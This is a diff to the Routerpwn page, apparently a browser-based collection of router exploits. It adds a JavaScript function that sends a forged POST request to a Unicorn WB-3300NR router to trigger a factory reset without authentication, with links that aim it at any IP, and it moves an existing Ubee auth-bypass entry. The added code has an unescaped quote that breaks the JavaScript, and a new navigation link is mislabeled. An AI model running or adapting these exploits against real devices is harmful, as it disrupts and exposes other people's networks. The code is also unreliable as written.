@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.15.225</title>
+		<title>Routerpwn 1.15.226</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link rel="shortcut icon" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -90,7 +90,7 @@ column-count:4;
 		border-style: solid;
 	}
 
-	#alpha,#ruggedcom,#freebox,#seagate,#sitecom,#wire,#com,#arris,#asmax,#asus,#alcatellucent,#belkin,#cisco,#comtrend,#DDWRT,#DLink,#zoom,#smc,#Easybox,#fibrehome,#huawei,#mifi,#motorola,#netgear,#pirelli,#sagem,#siemens,#thomson,#tplink,#trendnet,#ubiquiti,#utstarcom,#xavi,#zyxel, #ubee, #zte, #EE, #DD-WRT {
+	#alpha,#ruggedcom,#freebox,#seagate,#sitecom,#wire,#com,#arris,#asmax,#asus,#alcatellucent,#belkin,#cisco,#comtrend,#DDWRT,#DLink,#zoom,#smc,#Easybox,#fibrehome,#huawei,#mifi,#motorola,#netgear,#pirelli,#sagem,#siemens,#thomson,#tplink,#trendnet,#ubiquiti,#utstarcom,#xavi,#zyxel, #ubee, #zte, #EE, #DD-WRT, #unicorn {
 		background-image: url("bg.jpg");
 	}
 
@@ -184,6 +184,17 @@ function getxss() {
 	  xss=prompt("Enter custom XSS injection:");
 		}
 	return xss;
+}
+
+// Unicorn Router WB-3300NR - Factory Reset
+function wb3300nr_factoryreset(ip)
+{
+    ip = ip || "192.168.123.254";
+    form = '<input type="hidden" name="CMD" value="SYS_CONF">\
+	<input type="hidden" name="GO" value="system_reboot.asp">\
+    <input type="hidden" name="CCMD" value='0'>';
+	post('http://' + ip + '/goform/SysToolRestoreSet', form);
+
 }
 
 // Alcatel-Lucent OmniPCX Enterprise - masterCGI Arbitrary Command Execution
@@ -2163,6 +2174,7 @@ a=a+1
 			<div><h2><a href="#trendnet">TRENDnet</a></h2></div>
 			<div><h2><a href="#ubee">Ubee</a></h2></div>
 			<div><h2><a href="#ubiquiti">Ubiquiti</a></h2></div>
+			<div><h2><a href="#unicorn">UTStarcom</a></h2></div>
 			<div><h2><a href="#utstarcom">UTStarcom</a></h2></div>
 			<div><h2><a href="#xavi">Xavi</a></h2></div>
 			<div><h2><a href="#zyxel">ZyXEL</a></h2></div>
@@ -4033,7 +4045,23 @@ a=a+1
 	<div><a href="javascript:setip('/reboot.cgi?reset=true')">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
-</section><br><br><section id="ubiquiti">
+</section><br><br>
+
+<section id="ubee">
+<h2>Ubee</h2>
+<h3><a href="javascript:img('Ubee Cablemas')">Ubee Cablemas</a></h3>
+<article>
+	<div>02/20/14</div>
+	<div><a href="https://github.com/hkm/routerpwn.com/issues/32">[+]</a></div>
+	<div><a href="javascript:ubecablemas_bypass()">Ubee Cablemas - Auth Bypass</a></div>
+	<div><a href="javascript:ubecablemas_bypass(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+<div style="float: right"><a href="#">^ Top</a></div>
+</section><br><br>
+
+
+
+<section id="ubiquiti">
 <h2>Ubiquiti</h2>
 <h3><a href="javascript:img('AirOS')">AirOS v3.6.1, v4.0, v5.x</a></h3>
 
@@ -4059,15 +4087,15 @@ a=a+1
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br>
 
-<section id="ubee">
-<h2>Ubee</h2>
-<h3><a href="javascript:img('Ubee Cablemas')">Ubee Cablemas</a></h3>
+<section id="unicorn">
+<h2>Unicorn</h2>
+<h3><a href="javascript:img('WB-3300NR')">WB-3300NR</a></h3>
 
 <article>
-	<div>02/20/14</div>
-	<div><a href="https://github.com/hkm/routerpwn.com/issues/32">[+]</a></div>
-	<div><a href="javascript:ubecablemas_bypass()">Ubee Cablemas - Auth Bypass</a></div>
-	<div><a href="javascript:ubecablemas_bypass(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+	<div>10/29/13</div>
+	<div><a href="http://www.securityfocus.com/archive/1/529529/30/0/threaded">[+]</a></div>
+	<div><a href="javascript:wb3300nr_factoryreset()">Unicorn Router WB-3300NR - Factory Reset</a></div>
+	<div><a href="javascript:wb3300nr_factoryreset(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
 </article>
 
 <div style="float: right"><a href="#">^ Top</a></div>
